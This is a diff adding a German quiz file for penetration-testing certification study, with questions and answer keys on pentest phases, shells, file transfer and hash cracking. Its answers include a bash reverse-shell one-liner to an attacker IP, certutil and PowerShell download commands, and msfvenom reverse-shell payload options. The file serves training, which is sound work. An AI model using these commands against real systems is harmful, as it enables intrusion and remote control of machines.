@@ -1,0 +1,113 @@
+# titel: Methodik, Shells & Tools
+# kategorie: Methodik
+# os: general
+# schwierigkeit: easy
+# zert: CJCA, CPTS, CBBH
+# modul: Getting Started
+# beschreibung: Pentest-Prozess, Reverse Shells, Shell-Upgrade, File Transfer und Hash-Cracking – das Handwerkszeug.
+
+?order Bringe die Phasen des Penetration-Testing-Prozesses in die richtige Reihenfolge
+> Pre-Engagement
+> Information Gathering
+> Vulnerability Assessment
+> Exploitation
+> Post-Exploitation
+> Lateral Movement
+> Proof-of-Concept
+> Post-Engagement
+
+? Welcher Befehl startet einen Netcat-Listener auf Port 4444 (verbose, kein DNS)?
+= nc -lvnp 4444
+= nc -nlvp 4444
+= re:nc -[lvnp]{4} 4444
+! `-l` listen, `-v` verbose, `-n` keine DNS-Auflösung, `-p` Port.
+
+? Was ist der Unterschied zwischen Reverse Shell und Bind Shell?
++ Reverse: das Ziel verbindet sich zum Angreifer. Bind: das Ziel öffnet einen Port, der Angreifer verbindet sich.
+- Reverse: der Angreifer öffnet einen Port auf dem Ziel. Bind: das Ziel verbindet sich zum Angreifer.
+- Es gibt keinen Unterschied
+- Bind Shells funktionieren nur unter Windows
+! Reverse Shells umgehen eingehende Firewall-Regeln – deshalb der Standard.
+
+? Welcher klassische Bash-Reverse-Shell-Einzeiler verbindet sich zu 10.10.14.5:4444?
++ bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+- bash -c 10.10.14.5:4444
+- nc -lvnp 10.10.14.5 4444
+- ssh -R 4444 10.10.14.5
+
+? Mit welchem Python-Einzeiler upgradest du eine simple Shell zu einer PTY?
+= python3 -c 'import pty;pty.spawn("/bin/bash")'
+= python3 -c 'import pty; pty.spawn("/bin/bash")'
+= python -c 'import pty;pty.spawn("/bin/bash")'
+= re:python3? -c ['"]import pty; ?pty\.spawn\(['"]/bin/(ba)?sh['"]\)['"]
+! Danach `Strg+Z`, `stty raw -echo; fg`, `export TERM=xterm` für eine voll interaktive Shell.
+
+? Welcher Befehl wird nach Strg+Z eingegeben, um die Shell voll interaktiv zu machen?
+= stty raw -echo; fg
+= stty raw -echo;fg
+= stty raw -echo && fg
+
+? Mit welchem Einzeiler startest du schnell einen Webserver auf Port 8000 zum File-Transfer?
+= python3 -m http.server 8000
+= python3 -m http.server
+! Auf dem Ziel dann `wget http://10.10.14.x:8000/datei` oder `curl -O ...`.
+
+? Welches eingebaute Windows-Tool kann Dateien herunterladen (LOLBin)?
++ certutil
+- whoami
+- tasklist
+- ipconfig
+! `certutil -urlcache -split -f http://IP/nc.exe nc.exe`. In PowerShell: `iwr http://IP/f -OutFile f`.
+
+? Welches Tool erzeugt Payloads wie `-p windows/x64/shell_reverse_tcp -f exe`?
+= msfvenom
+
+? Mit welchem Tool durchsucht man die lokale Exploit-DB-Kopie auf Kali?
+= searchsploit
+! `searchsploit -m <id>` kopiert den Exploit ins aktuelle Verzeichnis.
+
+? Welche Hashcat-Option legt den Hash-Typ fest?
+= -m
+! Attack-Mode ist `-a` (0 = Wortliste). Beispiel: `hashcat -m 1000 hash.txt rockyou.txt`.
+
+? Wo liegt die berühmte Wortliste rockyou auf Kali?
+= /usr/share/wordlists/rockyou.txt
+= /usr/share/wordlists/rockyou.txt.gz
+! Vor der ersten Nutzung ggf. mit `gunzip` entpacken.
+
+? Welche Rechte muss ein privater SSH-Key haben, damit ssh ihn akzeptiert?
+= 600
+= chmod 600
+= 400
+! Zu offene Rechte → „UNPROTECTED PRIVATE KEY FILE!“.
+
+? Mit welcher ssh-Option meldest du dich mit einem privaten Schlüssel an?
+= -i
+! `ssh -i id_rsa user@IP`.
+
+? Welches John-Hilfsskript wandelt einen verschlüsselten SSH-Key in einen knackbaren Hash um?
+= ssh2john
+= ssh2john.py
+! Ähnlich: zip2john, keepass2john, office2john.
+
+? Wie dekodiert man auf Linux einen Base64-String in einer Datei?
+= base64 -d datei
+= base64 -d
+= re:base64 (-d|--decode)( \S+)?
+
+?tf CVSS bewertet die Schwere einer Schwachstelle auf einer Skala von 0.0 bis 10.0.
+= wahr
+! 9.0–10.0 = Critical. Wichtig für den Report im CPTS-Exam.
+
+? Welches Tool tunnelt Traffic über eine kompromittierte Maschine in ein internes Netz, indem es einen TUN-Adapter nutzt (modern, ohne proxychains)?
++ ligolo-ng
+- hashcat
+- gobuster
+- wpscan
+! Alternativen: chisel + proxychains, SSH Dynamic Port Forwarding (`ssh -D 9050`).
+
+? Mit welcher SSH-Option baust du einen dynamischen SOCKS-Proxy auf Port 9050 auf?
+= -D 9050
+= ssh -D 9050
+= -D
+! Danach Tools über `proxychains` laufen lassen.
